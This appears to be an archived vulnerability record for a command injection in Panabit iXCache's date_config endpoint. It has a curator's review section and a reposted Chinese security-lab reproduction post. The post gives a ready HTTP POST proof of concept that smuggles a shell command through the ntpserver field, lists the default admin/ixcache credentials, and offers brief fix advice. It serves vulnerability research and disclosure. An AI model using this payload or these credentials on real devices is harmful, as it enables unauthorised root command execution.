---
source: "MrWQ/vulnerability-paper"
id: "vw-d110a3da7412f8890a51de96"
entity_id: "ve-d110a3da7412f8890a51de96"
schema_version: "1"
title: "Panabit 智能应用网关远程代码执行漏洞"
product: "Panabit iXCache"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "SHANGHAI r3 [11.1]，高权限后台admin/ixcache或有效凭据"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Panabit/Panabit%20%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；时间/NTP 设置会改变设备时钟及同步配置，可能影响日志、证书和业务；需记录原值并在隔离实验后恢复"
source_url: "https://mp.weixin.qq.com/s/-zOZboVhVidkjE14a1YjgA"
source_status: "recorded"
---

# Panabit 智能应用网关远程代码执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Panabit iXCache
- 本文讨论：date_config ntpserver命令注入
- 版本、权限与配置前提：SHANGHAI r3 [11.1]，高权限后台admin/ixcache或有效凭据
- 资料类型：PoC转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题智能应用网关泛化，实际iXCache缓存产品
- 请求Content-Length后缺空行，Cookie带Path属性不规范
- 宣称已有补丁仅主页链接无版本；与727相比省略配置写入/source二阶段根因
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 时间/NTP 设置会改变设备时钟及同步配置，可能影响日志、证书和业务；需记录原值并在隔离实验后恢复

### 待核与来源

- 版本标识是产品固件还是系统版本、root/修复待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-zOZboVhVidkjE14a1YjgA)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

panabit 是一款用于流量控制的实用软件工具，panabit 缓存加速产品是一款基于派网公司自研的操作系统（PanaOS）上研发的内容缓存产品。iXCache 依靠高稳定性、高可靠性两大特点，可缓存丰富的资源，目前支持 Web 视频、移动视频、Web 音乐、移动音乐、软件下载、应用商店、游戏补丁等八大类资源的缓存。部署灵活、支持交换机镜像和 Panabit 牵引两种模式，满足不同级别的用户需求。

panabit iXCache 系统 **date_config 存在命令执行漏洞**，攻击者在获取 Web 权限的情况下，可通过构造 payload 进行远程命令注入，获取设备 root 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

  

影响版本 SHANGHAI r3 [11.1]

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hA8803KxcQScEShwxphsvibHQ2kEzbtR42qTrOBowRV5WBzicc95OoRI3TCRMhBL2eWVFZk3XcqRllw/640?wx_fmt=png)

**利用此漏洞需要高权限（****默认账号 admin 密码 ixcache****）**

2. 对漏洞进行复现

 **Poc（POST）**

```http
POST /cgi-bin/Maintain/date_config HTTP/1.1
Host: 127.0.0.1
Cookie: pauser_1626709857_644740=paonline_admin_48217_16289319551;Path=/;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
ntpserver=0.0.0.0;id&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1

```

POST 请求，响应存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hA8803KxcQScEShwxphsvibHB9J19osM2lospcNqRe0FbPAOwZclglibUxXxGR7TI8KXAImu57DV5uw/640?wx_fmt=png)

        执行 id 命令，前端页面

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hA8803KxcQScEShwxphsvibHmzyhElHyWtXEx7ghdIhey4MUIicmxqT25dF7gEtWB4CQgUxNCFwDdeQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

该漏洞由于正常功能过滤不严格导致存在命令注入，并且需要高权限账号登录操作，建议修改登录密码为强口令，通过白名单控制访问源地址。

```
https://www.panabit.com

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
